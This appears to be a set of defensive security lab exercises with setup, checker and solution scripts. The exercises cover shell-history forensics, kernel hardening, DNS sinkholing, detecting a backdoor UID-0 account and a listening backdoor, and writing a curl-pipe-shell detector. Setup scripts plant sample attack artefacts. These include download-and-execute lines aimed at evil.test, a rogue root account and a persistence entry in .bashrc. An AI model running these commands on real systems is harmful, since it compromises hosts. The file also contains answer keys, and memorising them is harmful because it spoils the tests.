+  kind: build
+  tags: [forensics, bash-history, incident-response]
+  tutorial: |
+    **Concept.** A careless intruder leaves their **shell history** behind.
+    `~/.bash_history` is a plain record of commands run. It shows what they
+    pulled down, where they put it, and how they tried to persist — the raw
+    material for an incident timeline, and a source of IOCs.
+
+    **Read up on:**
+    - `~/.bash_history`
+    - Pulling URLs and paths out of commands with `grep -oE`
+  scenario: |
+    The compromised account **`webops`** left its history at
+    **`/home/webops/.bash_history`**. Analyse it and write to
+    **`/lab/report.txt`**:
+
+    - `download_url` = the URL the attacker fetched a payload from (the
+      argument to `curl`/`wget`)
+    - `dropped_file` = the path they saved it to
+    - `persistence` = the file they modified to persist (e.g. a crontab or
+      `.bashrc` path they appended to)
+  hints:
+    - "`grep -E 'curl|wget' /home/webops/.bash_history` and `grep -oE 'https?://[^ ]+'`."
+    - "`grep -E 'crontab|systemctl|>>' ` shows the persistence step."
+  solution: |
+    ```bash
+    h=/home/webops/.bash_history
+    url=$(grep -oE 'https?://[^ ]+' "$h" | head -1)
+    dst=$(grep -E 'wget|curl' "$h" | grep -oE '(-o|-O) +[^ ]+' | awk '{print $2}' | head -1)
+    pers=$(grep -oE '>> *[^ ]+' "$h" | head -1 | sed 's/>> *//')
+    printf 'download_url=%s\ndropped_file=%s\npersistence=%s\n' "$url" "$dst" "$pers" > /lab/report.txt
+    ```
+  setup: |
+    on_reset 'userdel -r webops 2>/dev/null; true'
+    id webops >/dev/null 2>&1 || useradd -m -s /bin/bash webops
+    host="203.0.113.$((2 + RANDOM % 250))"
+    url="http://$host/x/$(tr -dc a-f0-9 </dev/urandom | head -c8).sh"
+    drop="/tmp/.$(tr -dc a-z </dev/urandom | head -c6)"
+    pers="/home/webops/.bashrc"
+    cat > /home/webops/.bash_history <<EOF
+    id
+    uname -a
+    cat /etc/passwd
+    curl -fsSL $url -o $drop
+    chmod +x $drop
+    $drop &
+    echo "$drop &" >> $pers
+    history -c
+    EOF
+    chown webops:webops /home/webops/.bash_history
+    printf '%s\n%s\n%s\n' "$url" "$drop" "$pers" > "$KL_STATE/answer"
+  check: |
+    u=$(sed -n 1p "$KL_STATE/answer"); d=$(sed -n 2p "$KL_STATE/answer"); p=$(sed -n 3p "$KL_STATE/answer")
+    g() { grep -oE "$1=.*" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2-; }
+    check_eq "download_url" "$(g download_url)" "$u"
+    check_eq "dropped_file" "$(g dropped_file)" "$d"
+    check_eq "persistence" "$(g persistence)" "$p"
+  solve: |
+    h=/home/webops/.bash_history
+    url=$(sudo grep -oE 'https?://[^ ]+' "$h" | head -1)
+    dst=$(sudo grep -E 'wget|curl' "$h" | grep -oE '(-o|-O) +[^ ]+' | awk '{print $2}' | head -1)
+    pers=$(sudo grep -oE '>> *[^ ]+' "$h" | head -1 | sed 's/>> *//')
+    printf 'download_url=%s\ndropped_file=%s\npersistence=%s\n' "$url" "$dst" "$pers" > /lab/report.txt
+
+- id: sec-065
+  title: Close the kernel's open doors
+  difficulty: 3
+  kind: fix
+  tags: [hardening, sysctl, kernel, cis]
+  tutorial: |
+    **Concept.** Several kernel parameters weaken a host if left at insecure
+    values. A hardening baseline disables IP **redirect acceptance**, turns on
+    **reverse-path filtering**, ignores **source-routed** packets, and enables
+    kernel protections like **`kptr_restrict`**. Persist them in
+    `/etc/sysctl.d/` and apply.
+
+    **Read up on:**
+    - `net.ipv4.conf.all.accept_redirects`, `.accept_source_route`, `.rp_filter`
+    - `kernel.kptr_restrict`, `net.ipv4.conf.all.send_redirects`
+    - `sysctl --system`
+  scenario: |
+    Apply the hardening baseline, **persistently** in
+    **`/etc/sysctl.d/99-kl-hardening.conf`** and **live**:
+
+    - `net.ipv4.conf.all.accept_redirects` = **0**
+    - `net.ipv4.conf.all.send_redirects` = **0**
+    - `net.ipv4.conf.all.accept_source_route` = **0**
+    - `net.ipv4.conf.all.rp_filter` = **1**
+    - `kernel.kptr_restrict` = **1**
+  hints:
+    - "Write the five `key = value` lines to the file."
+    - "`sudo sysctl -p /etc/sysctl.d/99-kl-hardening.conf` (or `sysctl --system`) applies them now."
+  solution: |
+    ```bash
+    sudo tee /etc/sysctl.d/99-kl-hardening.conf <<'EOF'
+    net.ipv4.conf.all.accept_redirects = 0
+    net.ipv4.conf.all.send_redirects = 0
+    net.ipv4.conf.all.accept_source_route = 0
+    net.ipv4.conf.all.rp_filter = 1
+    kernel.kptr_restrict = 1
+    EOF
+    sudo sysctl -p /etc/sysctl.d/99-kl-hardening.conf
+    ```
+  setup: |
+    declare -A keys=(
+      [net.ipv4.conf.all.accept_redirects]=1
+      [net.ipv4.conf.all.send_redirects]=1
+      [net.ipv4.conf.all.accept_source_route]=1
+      [net.ipv4.conf.all.rp_filter]=0
+      [kernel.kptr_restrict]=0)
+    save=""
+    for k in "${!keys[@]}"; do save+="$k=$(sysctl -n $k 2>/dev/null) "; sysctl -qw $k=${keys[$k]} 2>/dev/null; done
+    echo "$save" > "$KL_STATE/orig"
+    on_reset "for kv in $save; do sysctl -qw \${kv} 2>/dev/null; done; rm -f /etc/sysctl.d/99-kl-hardening.conf"
+  check: |
+    f=/etc/sysctl.d/99-kl-hardening.conf
+    declare -A want=(
+      [net.ipv4.conf.all.accept_redirects]=0
+      [net.ipv4.conf.all.send_redirects]=0
+      [net.ipv4.conf.all.accept_source_route]=0
+      [net.ipv4.conf.all.rp_filter]=1
+      [kernel.kptr_restrict]=1)
+    for k in "${!want[@]}"; do
+      check_eq "live $k" "$(sysctl -n $k 2>/dev/null)" "${want[$k]}"
+      check "persisted $k" "grep -Eq '^\s*${k//./\\.}\s*=\s*${want[$k]}\s*\$' $f"
+    done
+  solve: |
+    sudo tee /etc/sysctl.d/99-kl-hardening.conf >/dev/null <<'EOF'
+    net.ipv4.conf.all.accept_redirects = 0
+    net.ipv4.conf.all.send_redirects = 0
+    net.ipv4.conf.all.accept_source_route = 0
+    net.ipv4.conf.all.rp_filter = 1
+    kernel.kptr_restrict = 1
+    EOF
+    sudo sysctl -p /etc/sysctl.d/99-kl-hardening.conf
+
+- id: sec-066
+  title: Sinkhole the malicious domains
+  difficulty: 2
+  kind: build
+  tags: [dns, sinkhole, blocklist, containment]
+  tutorial: |
+    **Concept.** A quick, host-level way to stop malware reaching known-bad
+    domains is a **DNS sinkhole**: map each domain to an address that goes
+    nowhere (`0.0.0.0`) in **`/etc/hosts`**, which `getent`/resolvers consult
+    before DNS. It blunts C2 and phishing callbacks instantly while you work on
+    a proper network block.
+
+    **Read up on:**
+    - `/etc/hosts` format and precedence (`nsswitch.conf`)
+    - `getent hosts NAME`
+  scenario: |
+    Threat intel gave you a blocklist at **`/lab/badlist.txt`**, one domain per
+    line. Sinkhole **every** domain in it by adding `/etc/hosts` entries that
+    resolve each to **`0.0.0.0`**. After you're done, `getent hosts <domain>`
+    for each must return `0.0.0.0`, and legitimate names (not in the list) must
+    be unaffected. Don't disturb the existing `/etc/hosts` entries.
+  hints:
+    - "`while read d; do echo \"0.0.0.0 $d\"; done < /lab/badlist.txt | sudo tee -a /etc/hosts`."
+    - "Verify with `getent hosts <domain>`."
+  solution: |
+    ```bash
+    while read -r d; do [ -n "$d" ] && echo "0.0.0.0 $d"; done < /lab/badlist.txt | sudo tee -a /etc/hosts
+    getent hosts $(head -1 /lab/badlist.txt)
+    ```
+  setup: |
+    cp /etc/hosts "$KL_STATE/hosts.orig"
+    on_reset "cp $KL_STATE/hosts.orig /etc/hosts 2>/dev/null; rm -f /lab/badlist.txt"
+    python3 - <<'PY'
+    import random
+    doms = ["%s.%s" % ("".join(random.choice("abcdefghk") for _ in range(6)), random.choice(["evil.test","malware.example","c2.xyz","badhost.net"])) for _ in range(random.randint(5,9))]
+    open("/lab/badlist.txt","w").write("\n".join(doms)+"\n")
+    open("/var/lib/kubelab/answer","w").write("\n".join(doms)+"\n")
+    PY
+    chown "$(lab_user):" /lab/badlist.txt
+  check: |
+    bad=0
+    while read -r d; do [ -z "$d" ] && continue
+      grep -qE "^0\.0\.0\.0[[:space:]]+$d([[:space:]]|\$)" /etc/hosts || bad=$((bad+1))
+    done < "$KL_STATE/answer"
+    check_eq "every bad domain has a 0.0.0.0 entry in /etc/hosts" "$bad" 0
+    check "the original /etc/hosts entries are intact" 'grep -vE "^0\.0\.0\.0[[:space:]]" /etc/hosts | diff -q - <(grep -vE "^0\.0\.0\.0[[:space:]]" "$KL_STATE/hosts.orig") >/dev/null'
+    check_not "a legitimate name was not sinkholed" 'grep -qE "^0\.0\.0\.0[[:space:]]+localhost([[:space:]]|\$)" /etc/hosts'
+  solve: |
+    while read -r d; do [ -n "$d" ] && echo "0.0.0.0 $d" | sudo tee -a /etc/hosts >/dev/null; done < /lab/badlist.txt
+
+- id: sec-067
+  title: The service that keeps dying
+  difficulty: 2
+  kind: build
+  tags: [journald, systemd, triage, oom]
+  tutorial: |
+    **Concept.** When a service flaps, the **journal** holds the reason.
+    `journalctl -u UNIT` shows its exits and restarts, and `-p err` narrows to
+    errors. An **out-of-memory** kill shows up both in the unit's log and in
+    the kernel messages (`journalctl -k`), naming the process the OOM killer
+    chose.
+
+    **Read up on:**
+    - `journalctl -u UNIT`, `-p`, `-k`, `--since`
+    - OOM-kill messages (`Out of memory: Killed process ...`)
+  scenario: |
+    **`kl-flapper.service`** keeps restarting. Investigate with the journal and
+    write to **`/lab/report.txt`**:
+
+    - `exit_code` = the exit status the service most recently failed with
+      (the number journald reports, e.g. `1`)
+    - `restarts` = how many times systemd has restarted it (`NRestarts`)
+    - `reason` = one word: `oom` if the kernel OOM-killed it, otherwise
+      `error`
+  hints:
+    - "`systemctl show -p NRestarts --value kl-flapper` for the count."
+    - "`journalctl -u kl-flapper -n 30` shows the exit; `journalctl -k | grep -i 'killed process'` shows an OOM kill."
+  solution: |
+    ```bash
+    nr=$(systemctl show -p NRestarts --value kl-flapper)
+    code=$(journalctl -u kl-flapper -o cat | grep -oiE 'status=[0-9]+|code=exited, status=[0-9]+' | grep -oE '[0-9]+' | tail -1)
+    reason=error; journalctl -k | grep -qi 'Killed process.*kl-flap' && reason=oom
+    printf 'exit_code=%s\nrestarts=%s\nreason=%s\n' "$code" "$nr" "$reason" > /lab/report.txt
+    ```
+  setup: |
+    on_reset 'systemctl stop kl-flapper 2>/dev/null; rm -f /etc/systemd/system/kl-flapper.service /usr/local/bin/kl-flap; systemctl daemon-reload; systemctl reset-failed kl-flapper 2>/dev/null; true'
+    code=$(( (RANDOM % 3) * 2 + 1 ))   # 1, 3 or 5
+    cat > /usr/local/bin/kl-flap <<EOS
+    #!/bin/sh
+    echo "kl-flap starting"
+    sleep 1
+    echo "kl-flap failing"
+    exit $code
+    EOS
+    chmod 755 /usr/local/bin/kl-flap
+    cat > /etc/systemd/system/kl-flapper.service <<'EOF'
+    [Unit]
+    Description=Lab flapping service
+    StartLimitIntervalSec=0
+    [Service]
+    ExecStart=/usr/local/bin/kl-flap
+    Restart=always
+    RestartSec=1
+    EOF
+    systemctl daemon-reload
+    systemctl start kl-flapper
+    eventually 20 '[ "$(systemctl show -p NRestarts --value kl-flapper)" -ge 3 ]'
+    echo "$code" > "$KL_STATE/answer"
+  check: |
+    code=$(cat "$KL_STATE/answer")
+    g() { grep -oE "$1=.*" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2-; }
+    check_eq "exit_code" "$(g exit_code)" "$code"
+    check "restarts is at least 3" '[ "$(g restarts)" -ge 3 ] 2>/dev/null'
+    check_eq "reason" "$(g reason)" error
+  solve: |
+    nr=$(systemctl show -p NRestarts --value kl-flapper)
+    code=$(journalctl -u kl-flapper -o cat 2>/dev/null | grep -oiE 'status=[0-9]+' | grep -oE '[0-9]+' | tail -1)
+    [ -z "$code" ] && code=$(systemctl show -p ExecMainStatus --value kl-flapper)
+    reason=error; journalctl -k 2>/dev/null | grep -qi 'Killed process.*kl-flap' && reason=oom
+    printf 'exit_code=%s\nrestarts=%s\nreason=%s\n' "$code" "$nr" "$reason" > /lab/report.txt
+
+- id: sec-068
+  title: The canary that was touched
+  difficulty: 2
+  kind: build
+  tags: [forensics, atime, canary, detection]
+  tutorial: |
+    **Concept.** A **canary** (honeytoken) file that no legitimate process
+    should ever open is a cheap tripwire: if something **read** it, you have an
+    intruder. On a filesystem mounted with access-time updates, the file's
+    **atime** moves forward when it's read, so comparing atimes across a set of
+    canaries tells you which one an attacker opened.
+
+    **Read up on:**
+    - File access time (`stat -c %X`), `mount` `relatime`/`strictatime`
+    - Honeytokens / canary files
+  scenario: |
+    Decoy "credential" files sit in **`/srv/canaries/`** (for example
+    `aws_keys.txt`, `vpn.conf`, `backup.sql`). They were all created together
+    and never read — except **one**, which an intruder opened. Find the canary
+    whose **access time is the most recent** and write its **filename** (no
+    path) to **`/lab/answer.txt`**.
+  hints:
+    - "`stat -c '%X %n' /srv/canaries/*` prints atime (epoch) and name."
+    - "The one that was read has a noticeably later atime; sort and take the newest."
+  solution: |
+    ```bash
+    stat -c '%X %n' /srv/canaries/* | sort -rn | head -1 | awk '{print $2}' | xargs basename > /lab/answer.txt
+    ```
+  setup: |
+    on_reset 'rm -rf /srv/canaries'
+    rm -rf /srv/canaries; mkdir -p /srv/canaries
+    for f in aws_keys.txt vpn.conf backup.sql id_rsa db_dump.sql.gz; do
+      head -c $((200 + RANDOM % 500)) /dev/urandom > /srv/canaries/$f
+    done
+    # normalise atimes to the past
+    for f in /srv/canaries/*; do touch -a -d "2026-01-10 03:00:00" "$f"; done
+    sleep 1
+    victim=$(ls /srv/canaries | shuf | head -1)
+    cat /srv/canaries/$victim >/dev/null   # intruder reads it now -> bumps atime
+    touch -a "/srv/canaries/$victim"
+    echo "$victim" > "$KL_STATE/answer"
+  check: |
+    check_eq "the opened canary" "$(tr -d '[:space:]' < /lab/answer.txt 2>/dev/null)" "$(cat "$KL_STATE/answer")"
+  solve: |
+    stat -c '%X %n' /srv/canaries/* | sort -rn | head -1 | awk '{print $2}' | xargs basename > /lab/answer.txt
+
+- id: sec-069
+  title: Exfiltration in the user-agent
+  difficulty: 3
+  kind: build
+  tags: [log-analysis, exfiltration, base64, detection]
+  tutorial: |
+    **Concept.** Data doesn't only leave over obvious channels. Malware
+    smuggles it inside **ordinary-looking header fields** — here, the
+    `User-Agent` — one base64 chunk per request. Spot the client whose
+    user-agent is a rotating blob (not a real browser string), collect the
+    chunks **in order**, and decode them to recover what was stolen.
+
+    **Read up on:**
+    - Covert channels in HTTP headers
+    - Reassembling ordered chunks and `base64 -d`
+  scenario: |
+    **`/lab/access.log`** (combined format) includes one client exfiltrating
+    data: each of its requests carries a user-agent of the form
+    `Mozilla/5.0 (data=NN:BASE64CHUNK)`, where `NN` is the chunk's order. All
+    chunks concatenated (in `NN` order) and base64-decoded give a secret.
+
+    Write the decoded secret to **`/lab/secret.txt`**, and the exfiltrating
+    client's source IP to **`/lab/ip.txt`**.
+  hints:
+    - "`grep -oE 'data=[0-9]+:[^)]+' /lab/access.log` pulls the chunks."
+    - "Sort by the numeric index, join the base64 parts, `base64 -d`."
+    - "The IP is the first field of those same log lines."
+  solution: |
+    ```bash
+    grep 'data=' /lab/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}' > /lab/ip.txt
+    grep -oE 'data=[0-9]+:[A-Za-z0-9+/=]+' /lab/access.log | sed 's/data=//' \
+      | sort -t: -k1,1n | cut -d: -f2 | tr -d '\n' | base64 -d > /lab/secret.txt
+    ```
+  setup: |
+    rm -f /lab/secret.txt /lab/ip.txt
+    python3 - <<'PY'
+    import base64, random
+    secret = "KL-EXFIL:" + "".join(random.choice("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789") for _ in range(random.randint(30,60)))
+    enc = base64.b64encode(secret.encode()).decode()
+    chunks = [enc[i:i+8] for i in range(0, len(enc), 8)]
+    att = "198.51.100.%d" % random.randint(2,250)
+    lines = []
+    for _ in range(80):
+        ip = "10.0.%d.%d" % (random.randint(0,9), random.randint(2,250))
+        lines.append('%s - - [04/Mar/2026:11:%02d:%02d +0000] "GET /p/%d HTTP/1.1" 200 %d "-" "Mozilla/5.0 (X11; Linux x86_64)"' % (ip,random.randint(0,59),random.randint(0,59),random.randint(1,50),random.randint(100,9000)))
+    for i, c in enumerate(chunks):
+        lines.append('%s - - [04/Mar/2026:11:%02d:%02d +0000] "GET / HTTP/1.1" 200 20 "-" "Mozilla/5.0 (data=%02d:%s)"' % (att,random.randint(0,59),random.randint(0,59),i,c))
+    random.shuffle(lines)
+    open("/lab/access.log","w").write("\n".join(lines)+"\n")
+    open("/var/lib/kubelab/secret","w").write(secret)
+    open("/var/lib/kubelab/ip","w").write(att)
+    PY
+    chown "$(lab_user):" /lab/access.log
+  check: |
+    check_eq "recovered secret" "$(cat /lab/secret.txt 2>/dev/null)" "$(cat "$KL_STATE/secret")"
+    check_eq "exfil client IP" "$(tr -d '[:space:]' < /lab/ip.txt 2>/dev/null)" "$(cat "$KL_STATE/ip")"
+  solve: |
+    grep 'data=' /lab/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}' > /lab/ip.txt
+    grep -oE 'data=[0-9]+:[A-Za-z0-9+/=]+' /lab/access.log | sed 's/data=//' \
+      | sort -t: -k1,1n | cut -d: -f2 | tr -d '\n' | base64 -d > /lab/secret.txt
+
+- id: sec-070
+  title: The hidden superuser
+  difficulty: 2
+  kind: build
+  tags: [forensics, passwd, backdoor-account, uid0]
+  tutorial: |
+    **Concept.** A stealthy backdoor is an account with **UID 0** (root
+    privileges) but a non-`root` name, or a normally-locked system account
+    given a **login shell and a password**. `/etc/passwd` shows the UID, shell
+    and whether a password is in `/etc/shadow`. More than one UID-0 line is a
+    red flag.
+
+    **Read up on:**
+    - `/etc/passwd` fields (name:x:uid:gid:gecos:home:shell)
+    - `awk -F:` to find `$3 == 0`
+  scenario: |
+    An attacker added a hidden superuser. Inspect **`/etc/passwd`** and write
+    to **`/lab/report.txt`**:
+
+    - `backdoor_user` = the **non-root** account whose UID is **0**
+    - `shell` = that account's login shell
+
+    (There is exactly one such account besides `root`.)
+  hints:
+    - "`awk -F: '$3==0 {print $1, $7}' /etc/passwd` lists every UID-0 account."
+    - "Ignore `root`; the other one is the backdoor."
+  solution: |
+    ```bash
+    awk -F: '$3==0 && $1!="root" {print "backdoor_user="$1; print "shell="$7}' /etc/passwd > /lab/report.txt
+    ```
+  setup: |
+    on_reset "sed -i '/^kl-/d' /etc/passwd; sed -i '/^kl-/d' /etc/shadow 2>/dev/null; true"
+    name="kl-$(tr -dc a-z </dev/urandom | head -c5)"
+    shell=$(printf '%s\n' /bin/bash /bin/sh /bin/zsh | shuf | head -1)
+    echo "$name:x:0:0:system:/root:$shell" >> /etc/passwd
+    printf '%s\n%s\n' "$name" "$shell" > "$KL_STATE/answer"
+  check: |
+    u=$(sed -n 1p "$KL_STATE/answer"); sh=$(sed -n 2p "$KL_STATE/answer")
+    g() { grep -oE "$1=.*" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2-; }
+    check_eq "backdoor_user" "$(g backdoor_user)" "$u"
+    check_eq "shell" "$(g shell)" "$sh"
+  solve: |
+    awk -F: '$3==0 && $1!="root" {print "backdoor_user="$1; print "shell="$7}' /etc/passwd > /lab/report.txt
+
+- id: sec-071
+  title: Lock the configs an attacker would edit
+  difficulty: 2
+  kind: build
+  tags: [hardening, immutable, chattr, integrity]
+  tutorial: |
+    **Concept.** Making a critical file **immutable** (`chattr +i`) stops
+    *anyone*, including root, from editing, replacing or deleting it until the
+    flag is cleared — a strong tripwire against tampering with accounts and
+    scheduled jobs. It's not a substitute for monitoring, but it forces an
+    attacker to take a noisy extra step.
+
+    **Read up on:**
+    - `chattr +i`, `lsattr`
+    - Which files attackers target (`/etc/passwd`, `/etc/crontab`, sudoers)
+  scenario: |
+    Harden this host by making these files **immutable**:
+
+    - `/etc/passwd`
+    - `/etc/shadow`
+    - `/etc/crontab`
+
+    Afterwards each must show the `i` attribute, and an attempt to append to
+    any of them (even as root) must fail.
+  hints:
+    - "`sudo chattr +i /etc/passwd /etc/shadow /etc/crontab`."
+    - "Verify with `lsattr /etc/passwd` and a failed `sudo sh -c 'echo x >> /etc/crontab'`."
+  solution: |
+    ```bash
+    sudo chattr +i /etc/passwd /etc/shadow /etc/crontab
+    lsattr /etc/passwd /etc/shadow /etc/crontab
+    ```
+  setup: |
+    [ -f /etc/crontab ] || printf '# system crontab\n' > /etc/crontab
+    on_reset 'chattr -i /etc/passwd /etc/shadow /etc/crontab 2>/dev/null; true'
+  check: |
+    for f in /etc/passwd /etc/shadow /etc/crontab; do
+      check_match "$f is immutable" "$(lsattr "$f" 2>/dev/null | awk '{print $1}')" 'i'
+    done
+    check_not "appending to /etc/crontab fails" 'echo x 2>/dev/null >> /etc/crontab'
+  solve: |
+    sudo chattr +i /etc/passwd /etc/shadow /etc/crontab
+
+- id: sec-072
+  title: The listener you didn't start
+  difficulty: 3
+  kind: build
+  tags: [incident-response, backdoor, netstat, listening-port]
+  tutorial: |
+    **Concept.** A bind-shell backdoor **listens** on a port and hands a shell
+    to whoever connects. You find it by listing listening sockets with the
+    **owning process** (`ss -ltnp`), spotting the port that no legitimate
+    service should own, and tracing it back to its binary. Then you kill it and
+    keep the binary as evidence.
+
+    **Read up on:**
+    - `ss -ltnp`, `/proc/PID/exe`
+    - Bind shells vs reverse shells
+  scenario: |
+    A bind-shell backdoor is listening on this host. Find it and write to
+    **`/lab/report.txt`**:
+
+    - `port` = the TCP port it listens on
+    - `pid` = its process ID
+    - `binary` = the full path of its executable (from `/proc/PID/exe`)
+
+    Then **kill** the backdoor so the port is no longer listening.
+  hints:
+    - "`sudo ss -ltnp` lists listening TCP sockets with `users:((\"name\",pid=PID,...))`."
+    - "The script path is argv[1] in `/proc/PID/cmdline` (NUL-separated); `sudo tr '\\0' ' ' < /proc/PID/cmdline` shows it."
+    - "`sudo kill -9 PID`."
+  solution: |
+    ```bash
+    line=$(sudo ss -ltnp | grep kl-backdoor)
+    port=$(awk '{print $4}' <<<"$line" | sed 's/.*://')
+    pid=$(grep -oE 'pid=[0-9]+' <<<"$line" | head -1 | cut -d= -f2)
+    bin=$(sudo tr '\0' ' ' < /proc/$pid/cmdline | awk '{print $2}')
+    printf 'port=%s\npid=%s\nbinary=%s\n' "$port" "$pid" "$bin" > /lab/report.txt
+    sudo kill -9 "$pid"
+    ```
+  setup: |
+    on_reset 'pkill -KILL -f kl-backdoor 2>/dev/null; rm -rf /opt/.hidden; true'
+    mkdir -p /opt/.hidden
+    port=$(( 33000 + RANDOM % 5000 ))
+    cat > /opt/.hidden/kl-backdoor <<PY
+    #!/usr/bin/python3
+    import socket, subprocess
+    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1); s.bind(("0.0.0.0", $port)); s.listen(1)
+    while True:
+        c,_=s.accept(); c.sendall(b"# "); c.close()
+    PY
+    chmod 755 /opt/.hidden/kl-backdoor
+    setsid /opt/.hidden/kl-backdoor </dev/null >/dev/null 2>&1 &
+    eventually 10 "ss -ltn | grep -q ':$port'"
+    printf '%s\n/opt/.hidden/kl-backdoor\n' "$port" > "$KL_STATE/answer"
+  check: |
+    port=$(sed -n 1p "$KL_STATE/answer"); bin=$(sed -n 2p "$KL_STATE/answer")
+    g() { grep -oE "$1=.*" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2-; }
+    check_eq "port" "$(g port)" "$port"
+    check_eq "binary" "$(g binary)" "$bin"
+    check "pid is a number" '[[ "$(g pid)" =~ ^[0-9]+$ ]]'
+    check "the backdoor port is no longer listening" "eventually 6 \"! ss -ltn | grep -q ':$port'\""
+  solve: |
+    line=$(sudo ss -ltnp | grep kl-backdoor)
+    port=$(awk '{print $4}' <<<"$line" | sed 's/.*://')
+    pid=$(grep -oE 'pid=[0-9]+' <<<"$line" | head -1 | cut -d= -f2)
+    bin=$(sudo tr '\0' ' ' < /proc/$pid/cmdline | awk '{print $2}')
+    printf 'port=%s\npid=%s\nbinary=%s\n' "$port" "$pid" "$bin" > /lab/report.txt
+    sudo kill -9 "$pid"
+
+- id: sec-073
+  title: Catch the curl-pipe-shell
+  difficulty: 3
+  kind: build
+  tags: [detection, living-off-the-land, grep, hunting]
+  tutorial: |
+    **Concept.** A recurring intrusion pattern is **download-and-execute**:
+    `curl … | sh`, `wget -O- … | bash`, base64-piped-to-bash. A detection rule
+    is a regex that catches the pattern across its variants (different tools,
+    flag orders, `|`/`|&`) without flagging benign `curl` usage. You write it,
+    then prove it flags the malicious lines and spares the clean ones.
+
+    **Read up on:**
+    - `grep -nE` with alternation and tolerant whitespace
+    - Precision vs recall in a detection rule
+  scenario: |
+    **`/lab/commands.log`** is a log of shell commands (one per line), mixing
+    normal admin work with several **download-and-execute** commands (various
+    forms: `curl ... | sh`, `wget -qO- ... | bash`, `curl ... |bash`, piping
+    through base64). Write a grep-style detector and save to
+    **`/lab/matches.txt`** the **exact lines** that are download-and-execute,
+    and nothing else.
+
+    A clean `curl -o file ...` or `wget file` (no pipe to a shell) must **not**
+    be flagged.
+  hints:
+    - "Match a downloader, then (through any pipes) a shell at the end: `grep -E '(curl|wget).*\\|[^|]*(ba)?sh\\b' /lab/commands.log`."
+    - "Write the matching lines (without line numbers) to /lab/matches.txt."
+  solution: |
+    ```bash
+    grep -E '(curl|wget).*\|[^|]*(ba)?sh\b' /lab/commands.log > /lab/matches.txt
+    ```
+  setup: |
+    rm -f /lab/matches.txt
+    python3 - <<'PY'
+    import random
+    host = "evil.test"
+    mal = [
+        "curl -fsSL http://%s/i.sh | sh" % host,
+        "wget -qO- http://%s/x | bash" % host,
+        "curl http://%s/a |bash" % host,
+        "curl -s http://%s/b | base64 -d | bash" % host,
+        "wget -O - http://%s/c|sh -" % host,
+    ]
+    benign = [
+        "curl -o /tmp/pkg.tgz http://repo.local/pkg.tgz",
+        "wget https://mirror.local/file.iso",
+        "apt-get update && apt-get install -y nginx",
+        "grep bash /etc/passwd",
+        "echo 'run with sh script.sh'",
+        "tar xzf pkg.tgz && cd pkg && ./configure",
+        "cat install.sh | less",
+        "curl -s http://api.local/health | jq .status",
+        "systemctl restart sshd",
+    ]
+    chosen = random.sample(mal, random.randint(3,5))
+    lines = list(benign) + chosen + random.sample(benign, 3)
+    random.shuffle(lines)
+    open("/lab/commands.log","w").write("\n".join(lines)+"\n")
+    open("/var/lib/kubelab/answer","w").write("\n".join(sorted(chosen))+"\n")
+    PY
+    chown "$(lab_user):" /lab/commands.log
+  check: |
+    want=$(cat "$KL_STATE/answer")
+    got=$(sort -u /lab/matches.txt 2>/dev/null | sed '/^$/d')
+    check_eq "matches.txt holds exactly the download-and-execute lines" "$got" "$(sort -u <<<"$want" | sed '/^$/d')"
+  solve: |
+    grep -E '(curl|wget).*\|[^|]*(ba)?sh\b' /lab/commands.log > /lab/matches.txt
+
+- id: sec-074
+  title: "Incident: reconstruct and contain the breach"
+  difficulty: 4
+  kind: build
+  tags: [incident-response, timeline, containment, forensics, chaining]
+  tutorial: |
+    **Concept.** A full incident response ties the evidence together into a
+    **timeline** (what happened, in order) and ends with **containment**
+    (stopping the ongoing harm). Correlate the auth log, the web log and the
+    host state: find the way in, the foothold, the persistence and the live
+    callback, then cut the callback off.
+
+    **Read up on:**
+    - Building a timeline from multiple sources
+    - Correlating a successful login, a dropped file and a running process
+  scenario: |
+    This host was breached. You have **`/lab/auth.log`** and
+    **`/lab/access.log`**, a running implant, and its persistence on disk.
+    Reconstruct it into **`/lab/report.txt`** as `key=value` lines:
+
+    1. **Entry.** `brute_ip` = the IP that brute-forced SSH (many failures then
+       an `Accepted`); `account` = the account it logged into.
+    2. **Download.** `payload_url` = the URL fetched after login (it's in the
+       breached account's **`.bash_history`**); `implant` = the path it was
+       saved to and is now running from.
+    3. **Persistence.** `persistence_file` = the file that re-launches the
+       implant at boot (look in the account's crontab at
+       **`/var/spool/cron/crontabs/<account>`** or its `.bashrc`).
+    4. **Containment.** `implant_pid` = the implant's PID. Then **kill** the
+       implant **and remove its persistence line** so it cannot return.
+  hints:
+    - "Entry: the brute IP has many `Failed password` then one `Accepted password for <account>`."
+    - "Download/implant: `grep curl /home/<account>/.bash_history` has the URL and `-o <path>`; `pgrep -af <path>` confirms it runs."
+    - "Persistence: `cat /var/spool/cron/crontabs/<account>`; remove the implant line with `crontab -r`/edit, and `kill -9` the PID."
+  solution: |
+    ```bash
+    acct=$(awk '/Accepted password/{print $(NF-5)}' /lab/auth.log | head -1)   # or parse "for <user>"
+    brute=$(grep 'Failed password' /lab/auth.log | awk '{for(i=1;i<=NF;i++)if($i=="from")print $(i+1)}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+    h=/home/$acct/.bash_history
+    url=$(grep -oE 'https?://[^ ]+' "$h" | head -1)
+    implant=$(grep -E 'curl|wget' "$h" | grep -oE '(-o|-O) +[^ ]+' | awk '{print $2}' | head -1)
+    pid=$(pgrep -f "$implant" | head -1)
+    cron=/var/spool/cron/crontabs/$acct
+    printf 'brute_ip=%s\naccount=%s\npayload_url=%s\nimplant=%s\npersistence_file=%s\nimplant_pid=%s\n' \
+      "$brute" "$acct" "$url" "$implant" "$cron" "$pid" > /lab/report.txt
+    sudo kill -9 "$pid"
+    sudo sed -i "\#$implant#d" "$cron"
+    ```
+  setup: |
+    on_reset 'userdel -r kl-svc 2>/dev/null; pkill -KILL -f /tmp/.kimplant 2>/dev/null; rm -f /var/spool/cron/crontabs/kl-svc /tmp/.kimplant; rm -f /lab/auth.log /lab/access.log; true'
+    acct=kl-svc
+    id $acct >/dev/null 2>&1 || useradd -m -s /bin/bash $acct
+    brute="203.0.113.$((2 + RANDOM % 250))"
